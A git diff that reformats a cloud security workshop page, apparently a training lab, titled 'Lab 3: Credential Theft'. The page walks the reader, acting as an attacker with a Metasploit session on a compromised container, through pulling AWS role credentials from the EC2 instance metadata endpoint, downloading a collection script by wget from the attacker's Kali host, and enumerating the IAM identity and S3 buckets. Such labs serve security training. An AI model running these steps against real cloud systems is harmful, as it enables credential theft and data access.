@@ -1,4 +1,7 @@
-# Lab 3: Credential Theft
+---
+title: "Lab 3: Credential Theft"
+weight: 4
+---
 
 With root access to the container, we will set out to achieve our main objectives, data exfiltration and lateral movement. E-Crime adversaries often prioritize credential theft as a revenue generation strategy. Credentials are sold on the dark web to assist other adversaries in establishing quick and stealthy access to specific target organizations. In general though, credential access is a way to establish persistence and widen the attack.
 
@@ -14,17 +17,15 @@ Next, we’ll try to access EC2 instance metadata to try to capture AWS service 
 curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 ```
 
-> [!NOTE]
-> If your Metasploit session closes unexpectedly, type “run -j” at the metasploit console prompt to reconnect to the target.
+::alert[If your Metasploit session closes unexpectedly, type “run -j” at the metasploit console prompt to reconnect to the target.]{header="Note"}
 
-![Contents of /etc/passwd and instance metadata](lab3-1.png)
+![Contents of /etc/passwd and instance metadata](/static/img/lab3-1.png)
 
 **Lateral Movement**
 
 We will continue our attack by downloading some additional scripts that we can use to gather more information from the compromised container.
 
-> [!NOTE]
-> Using the netstat utility, you can easily find the Kali public IP by listing established HTTPS connections originating from the container.
+::alert[Using the netstat utility, you can easily find the Kali public IP by listing established HTTPS connections originating from the container.]{header="Note"}
 
 List established outbound connections to port 443 (HTTPS)
 
@@ -32,7 +33,7 @@ List established outbound connections to port 443 (HTTPS)
 netstat -n | grep 443
 ```
 
-![Netstat output](lab3-2.png)
+![Netstat output](/static/img/lab3-2.png)
 
 _The public IP in the fifth column is the Kali IP. Strip the “:443” socket port._
 
@@ -42,7 +43,7 @@ _Use the Kali’s public IP stored earlier or from the netstat command above, an
 wget http://<<Kali Public IP>>/collection.sh
 ```
 
-![Download the collection script](lab3-3.png)
+![Download the collection script](/static/img/lab3-3.png)
 
 Having gained an initial foothold in the network, attackers will then attempt to perform privilege escalation in order to move laterally to find more valuable assets.
 
@@ -56,7 +57,7 @@ Identify the AWS identity principal attached to the container
 aws sts get-caller-identity
 ```
 
-![Discover the identity principal](lab3-4.png)
+![Discover the identity principal](/static/img/lab3-4.png)
 
 In the IAM role (shown in the “Arn” field) we have a clue about which services we are allowed to access (i.e., “Pod S3 Access”).
 
@@ -66,7 +67,6 @@ Confirm access to S3 by listing the buckets
 aws s3 ls
 ```
 
-![Listing S3 contents](lab3-5.png)
+![Listing S3 contents](/static/img/lab3-5.png)
 
-> [!NOTE]
-> If your Metasploit session closes unexpectedly, type “run -j” at the metasploit console prompt to reconnect to the target.
+::alert[If your Metasploit session closes unexpectedly, type `run -j` at the metasploit console prompt to reconnect to the target.]{header="Note"}
